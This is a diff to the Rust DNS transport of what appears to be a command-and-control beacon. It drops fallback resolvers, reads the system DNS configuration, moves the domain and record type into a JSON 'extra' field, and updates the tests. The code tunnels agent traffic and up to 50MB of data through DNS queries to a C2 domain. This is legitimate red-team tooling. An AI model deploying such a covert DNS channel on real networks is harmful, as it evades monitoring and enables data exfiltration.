@@ -1,6 +1,6 @@
 use crate::Transport;
 use anyhow::{Context, Result};
-use pb::c2::transport::Type as TransportType;
+use hickory_resolver::system_conf::read_system_conf;
 use pb::c2::*;
 use pb::config::Config;
 use pb::dns::*;
@@ -19,9 +19,6 @@ const SEND_WINDOW_SIZE: usize = 10; // Packets in flight
 const MAX_RETRIES_PER_CHUNK: u32 = 3; // Max retries for a chunk
 const MAX_DATA_SIZE: usize = 50 * 1024 * 1024; // 50MB max data size
 
-// DNS resolver fallbacks
-const FALLBACK_DNS_SERVERS: &[&str] = &["1.1.1.1:53", "8.8.8.8:53"];
-
 /// DNS record type for queries
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 pub enum DnsRecordType {
@@ -34,8 +31,7 @@ pub enum DnsRecordType {
 #[derive(Debug, Clone)]
 pub struct DNS {
     base_domain: String,
-    dns_servers: Vec<String>, // Primary + fallback DNS servers
-    current_server_index: usize,
+    dns_server: String,
     record_type: DnsRecordType, // DNS record type to use for queries
 }
 
@@ -176,31 +172,13 @@ impl DNS {
         Ok(labels.join("."))
     }
 
-    /// Send packet and get response with resolver fallback
-    async fn send_packet(&mut self, packet: DnsPacket) -> Result<Vec<u8>> {
+    /// Send packet and get response
+    async fn send_packet(&self, packet: DnsPacket) -> Result<Vec<u8>> {
         let subdomain = self.build_subdomain(&packet)?;
         let (query, txid) = self.build_dns_query(&subdomain)?;
 
-        // Try each DNS server in order
-        let mut last_error = None;
-        for attempt in 0..self.dns_servers.len() {
-            let server_idx = (self.current_server_index + attempt) % self.dns_servers.len();
-            let server = &self.dns_servers[server_idx];
-
-            match self.try_dns_query(server, &query, txid).await {
-                Ok(response) => {
-                    // Update current server on success
-                    self.current_server_index = server_idx;
-                    return Ok(response);
-                }
-                Err(e) => {
-                    last_error = Some(e);
-                    // Continue to next resolver
-                }
-            }
-        }
-
-        Err(last_error.unwrap_or_else(|| anyhow::anyhow!("all DNS servers failed")))
+        // Use the configured DNS server (agent handles retry logic at transport level)
+        self.try_dns_query(&self.dns_server, &query, txid).await
     }
 
     /// Try a single DNS query against a specific server
@@ -861,85 +839,65 @@ impl Transport for DNS {
     fn init() -> Self {
         DNS {
             base_domain: String::new(),
-            dns_servers: Vec::new(),
-            current_server_index: 0,
+            dns_server: String::new(),
             record_type: DnsRecordType::TXT,
         }
     }
 
     fn new(config: Config) -> Result<Self> {
-        // Extract full URI from config (DNS needs query parameters)
-        let callback = crate::transport::extract_full_uri_from_config(&config)?;
+        // Extract URI (dns_server address) and extra config from config
+        let uri = crate::transport::extract_uri_from_config(&config)?;
 
-        // Parse DNS URL formats:
-        // dns://server:port?domain=dnsc2.realm.pub&type=txt (single server, TXT records)
-        // dns://*?domain=dnsc2.realm.pub&type=a (use system DNS + fallbacks, A records)
-        // dns://8.8.8.8:53,1.1.1.1:53?domain=dnsc2.realm.pub&type=aaaa (multiple servers, AAAA records)
-        let url = if callback.starts_with("dns://") {
-            callback
+        let dns_server = if uri == "dns://*" {
+            // Use system DNS resolver
+            let (sys_config, _opts) =
+                read_system_conf().context("failed to read system DNS configuration")?;
+            let server = sys_config
+                .name_servers()
+                .first()
+                .context("failed to get system DNS server")?;
+            format!("{}:53", server.socket_addr.ip())
         } else {
-            format!("dns://{}", callback)
-        };
+            // Parse dns://host or dns://host:port
+            let host_port = uri
+                .strip_prefix("dns://")
+                .context("invalid DNS URI scheme")?;
 
-        let parsed = url::Url::parse(&url)?;
-        let base_domain = parsed
-            .query_pairs()
-            .find(|(k, _)| k == "domain")
-            .map(|(_, v)| v.to_string())
-            .ok_or_else(|| anyhow::anyhow!("domain parameter is required"))?
+            if host_port.contains(':') {
+                // Port already provided
+                host_port.to_string()
+            } else {
+                // Append default port
+                format!("{}:53", host_port)
+            }
+        };
+        let extra = crate::transport::extract_extra_from_config(&config);
+
+        log::info!("dns_server: {dns_server}");
+
+        // Extract base_domain from extra field (required)
+        let base_domain = extra
+            .get("domain")
+            .ok_or_else(|| anyhow::anyhow!("domain parameter is required in extra config"))?
             .to_string();
 
         if base_domain.is_empty() {
             return Err(anyhow::anyhow!("domain parameter cannot be empty"));
         }
 
-        // Parse record type from URL (default: TXT)
-        let record_type = parsed
-            .query_pairs()
-            .find(|(k, _)| k == "type")
-            .map(|(_, v)| match v.to_lowercase().as_str() {
+        // Extract record_type from extra field (default: TXT)
+        let record_type = extra
+            .get("type")
+            .map(|v| match v.to_lowercase().as_str() {
                 "a" => DnsRecordType::A,
                 "aaaa" => DnsRecordType::AAAA,
                 _ => DnsRecordType::TXT,
             })
             .unwrap_or(DnsRecordType::TXT);
 
-        let mut dns_servers = Vec::new();
-
-        // Check if using wildcard for system DNS
-        if let Some(host) = parsed.host_str() {
-            if host == "*" {
-                // Use system DNS servers + fallbacks
-                #[cfg(feature = "dns")]
-                {
-                    use hickory_resolver::system_conf::read_system_conf;
-                    if let Ok((config, _opts)) = read_system_conf() {
-                        for server in config.name_servers() {
-                            dns_servers.push(format!("{}:53", server.socket_addr.ip()));
-                        }
-                    }
-                }
-                // Add fallbacks
-                dns_servers.extend(FALLBACK_DNS_SERVERS.iter().map(|s| s.to_string()));
-            } else {
-                // Parse comma-separated servers or single server
-                for server_part in host.split(',') {
-                    let server = server_part.trim();
-                    let port = parsed.port().unwrap_or(53);
-                    dns_servers.push(format!("{}:{}", server, port));
-                }
-            }
-        }
-
-        // If no servers configured, use fallbacks
-        if dns_servers.is_empty() {
-            dns_servers.extend(FALLBACK_DNS_SERVERS.iter().map(|s| s.to_string()));
-        }
-
         Ok(DNS {
             base_domain,
-            dns_servers,
-            current_server_index: 0,
+            dns_server,
             record_type,
         })
     }
@@ -1090,7 +1048,7 @@ impl Transport for DNS {
     }
 
     fn is_active(&self) -> bool {
-        !self.base_domain.is_empty() && !self.dns_servers.is_empty()
+        !self.base_domain.is_empty() && !self.dns_server.is_empty()
     }
 
     fn name(&self) -> &'static str {
@@ -1105,6 +1063,7 @@ impl Transport for DNS {
 #[cfg(test)]
 mod tests {
     use super::*;
+    use crate::TransportType;
     use pb::dns::PacketType;
 
     // ============================================================
@@ -1183,8 +1142,8 @@ mod tests {
     // URL Parsing / Transport::new Tests
     // ============================================================
 
-    // Helper function to create a test config with a DNS URI
-    fn create_dns_test_config(uri: &str) -> Config {
+    // Helper function to create a test config with DNS URI and extra params
+    fn create_dns_test_config(uri: &str, extra: &str) -> Config {
         use pb::c2::{AvailableTransports, Beacon, Transport};
         Config {
             info: Some(Beacon {
@@ -1193,7 +1152,7 @@ mod tests {
                         uri: uri.to_string(),
                         interval: 5,
                         r#type: TransportType::TransportDns as i32,
-                        extra: "{}".to_string(),
+                        extra: extra.to_string(),
                     }],
                     active_index: 0,
                 }),
@@ -1205,77 +1164,50 @@ mod tests {
 
     #[test]
     fn test_new_single_server() {
-        let config = create_dns_test_config("dns://8.8.8.8:53?domain=dnsc2.realm.pub");
+        let config = create_dns_test_config("8.8.8.8:53", r#"{"domain": "dnsc2.realm.pub"}"#);
         let dns = DNS::new(config).expect("should parse");
 
         assert_eq!(dns.base_domain, "dnsc2.realm.pub");
-        assert!(dns.dns_servers.contains(&"8.8.8.8:53".to_string()));
+        assert_eq!(dns.dns_server, "8.8.8.8:53");
         assert_eq!(dns.record_type, DnsRecordType::TXT);
     }
 
     #[test]
-    fn test_new_multiple_servers() {
-        // Multiple servers are specified in the host portion, comma-separated
-        let config = create_dns_test_config("dns://8.8.8.8,1.1.1.1:53?domain=dnsc2.realm.pub");
-        let dns = DNS::new(config).expect("should parse");
-
-        assert_eq!(dns.dns_servers.len(), 2);
-        assert!(dns.dns_servers.contains(&"8.8.8.8:53".to_string()));
-        assert!(dns.dns_servers.contains(&"1.1.1.1:53".to_string()));
-    }
-
-    #[test]
     fn test_new_record_type_a() {
-        let config = create_dns_test_config("dns://8.8.8.8?domain=dnsc2.realm.pub&type=a");
+        let config = create_dns_test_config(
+            "8.8.8.8:53",
+            r#"{"domain": "dnsc2.realm.pub", "type": "a"}"#,
+        );
         let dns = DNS::new(config).expect("should parse");
         assert_eq!(dns.record_type, DnsRecordType::A);
     }
 
     #[test]
     fn test_new_record_type_aaaa() {
-        let config = create_dns_test_config("dns://8.8.8.8?domain=dnsc2.realm.pub&type=aaaa");
+        let config = create_dns_test_config(
+            "8.8.8.8:53",
+            r#"{"domain": "dnsc2.realm.pub", "type": "aaaa"}"#,
+        );
         let dns = DNS::new(config).expect("should parse");
         assert_eq!(dns.record_type, DnsRecordType::AAAA);
     }
 
     #[test]
     fn test_new_record_type_txt_default() {
-        let config = create_dns_test_config("dns://8.8.8.8?domain=dnsc2.realm.pub");
+        let config = create_dns_test_config("8.8.8.8:53", r#"{"domain": "dnsc2.realm.pub"}"#);
         let dns = DNS::new(config).expect("should parse");
         assert_eq!(dns.record_type, DnsRecordType::TXT);
     }
 
     #[test]
-    fn test_new_wildcard_uses_fallbacks() {
-        let config = create_dns_test_config("dns://*?domain=dnsc2.realm.pub");
-        let dns = DNS::new(config).expect("should parse");
-
-        // Should have fallback servers
-        assert!(!dns.dns_servers.is_empty());
-        // Fallback servers include known DNS resolvers
-        let has_fallback = dns
-            .dns_servers
-            .iter()
-            .any(|s| s.contains("1.1.1.1") || s.contains("8.8.8.8"));
-        assert!(has_fallback, "Should have fallback DNS servers");
-    }
-
-    #[test]
     fn test_new_missing_domain() {
-        let config = create_dns_test_config("dns://8.8.8.8:53");
+        let config = create_dns_test_config("8.8.8.8:53", "{}");
         let result = DNS::new(config);
         assert!(result.is_err());
         assert!(result
             .unwrap_err()
             .to_string()
             .contains("domain parameter is required"));
-    }
-
-    #[test]
-    fn test_new_without_scheme() {
-        let config = create_dns_test_config("8.8.8.8:53?domain=dnsc2.realm.pub");
-        let dns = DNS::new(config).expect("should parse");
-        assert_eq!(dns.base_domain, "dnsc2.realm.pub");
     }
 
     // ============================================================
@@ -1286,8 +1218,7 @@ mod tests {
     fn test_build_subdomain_simple() {
         let dns = DNS {
             base_domain: "dnsc2.realm.pub".to_string(),
-            dns_servers: vec!["8.8.8.8:53".to_string()],
-            current_server_index: 0,
+            dns_server: "8.8.8.8:53".to_string(),
             record_type: DnsRecordType::TXT,
         };
 
@@ -1324,8 +1255,7 @@ mod tests {
     fn test_build_subdomain_label_splitting() {
         let dns = DNS {
             base_domain: "x.com".to_string(),
-            dns_servers: vec!["8.8.8.8:53".to_string()],
-            current_server_index: 0,
+            dns_server: "8.8.8.8:53".to_string(),
             record_type: DnsRecordType::TXT,
         };
 
@@ -1360,8 +1290,7 @@ mod tests {
     fn test_build_dns_query_txt() {
         let dns = DNS {
             base_domain: "dnsc2.realm.pub".to_string(),
-            dns_servers: vec![],
-            current_server_index: 0,
+            dns_server: String::new(),
             record_type: DnsRecordType::TXT,
         };
 
@@ -1392,9 +1321,8 @@ mod tests {
     #[test]
     fn test_parse_dns_response_too_short() {
         let dns = DNS {
-            base_domain: "".to_string(),
-            dns_servers: vec![],
-            current_server_index: 0,
+            base_domain: String::new(),
+            dns_server: String::new(),
             record_type: DnsRecordType::TXT,
         };
 
@@ -1406,9 +1334,8 @@ mod tests {
     #[test]
     fn test_parse_dns_response_txid_mismatch() {
         let dns = DNS {
-            base_domain: "".to_string(),
-            dns_servers: vec![],
-            current_server_index: 0,
+            base_domain: String::new(),
+            dns_server: String::new(),
             record_type: DnsRecordType::TXT,
         };
 
@@ -1430,15 +1357,13 @@ mod tests {
     fn test_calculate_max_chunk_size_larger_domain_smaller_chunk() {
         let dns_short = DNS {
             base_domain: "x.co".to_string(),
-            dns_servers: vec![],
-            current_server_index: 0,
+            dns_server: String::new(),
             record_type: DnsRecordType::TXT,
         };
 
         let dns_long = DNS {
             base_domain: "very.long.subdomain.dnsc2.realm.pub".to_string(),
-            dns_servers: vec![],
-            current_server_index: 0,
+            dns_server: String::new(),
             record_type: DnsRecordType::TXT,
         };
 
@@ -1457,8 +1382,7 @@ mod tests {
     fn test_validate_and_prepare_chunks_empty() {
         let dns = DNS {
             base_domain: "dnsc2.realm.pub".to_string(),
-            dns_servers: vec![],
-            current_server_index: 0,
+            dns_server: String::new(),
             record_type: DnsRecordType::TXT,
         };
 
@@ -1474,8 +1398,7 @@ mod tests {
     fn test_validate_and_prepare_chunks_small_data() {
         let dns = DNS {
             base_domain: "dnsc2.realm.pub".to_string(),
-            dns_servers: vec![],
-            current_server_index: 0,
+            dns_server: String::new(),
             record_type: DnsRecordType::TXT,
         };
 
@@ -1491,8 +1414,7 @@ mod tests {
     fn test_validate_and_prepare_chunks_exceeds_max() {
         let dns = DNS {
             base_domain: "dnsc2.realm.pub".to_string(),
-            dns_servers: vec![],
-            current_server_index: 0,
+            dns_server: String::new(),
             record_type: DnsRecordType::TXT,
         };
 
@@ -1511,7 +1433,7 @@ mod tests {
     fn test_init_creates_empty_transport() {
         let dns = DNS::init();
         assert!(dns.base_domain.is_empty());
-        assert!(dns.dns_servers.is_empty());
+        assert!(dns.dns_server.is_empty());
         assert!(!dns.is_active());
     }
 
@@ -1519,8 +1441,7 @@ mod tests {
     fn test_is_active_with_config() {
         let dns = DNS {
             base_domain: "dnsc2.realm.pub".to_string(),
-            dns_servers: vec!["8.8.8.8:53".to_string()],
-            current_server_index: 0,
+            dns_server: "8.8.8.8:53".to_string(),
             record_type: DnsRecordType::TXT,
         };
 
@@ -1530,9 +1451,8 @@ mod tests {
     #[test]
     fn test_is_active_empty_domain() {
         let dns = DNS {
-            base_domain: "".to_string(),
-            dns_servers: vec!["8.8.8.8:53".to_string()],
-            current_server_index: 0,
+            base_domain: String::new(),
+            dns_server: "8.8.8.8:53".to_string(),
             record_type: DnsRecordType::TXT,
         };
 
@@ -1540,11 +1460,10 @@ mod tests {
     }
 
     #[test]
-    fn test_is_active_no_servers() {
+    fn test_is_active_no_server() {
         let dns = DNS {
             base_domain: "dnsc2.realm.pub".to_string(),
-            dns_servers: vec![],
-            current_server_index: 0,
+            dns_server: String::new(),
             record_type: DnsRecordType::TXT,
         };
 
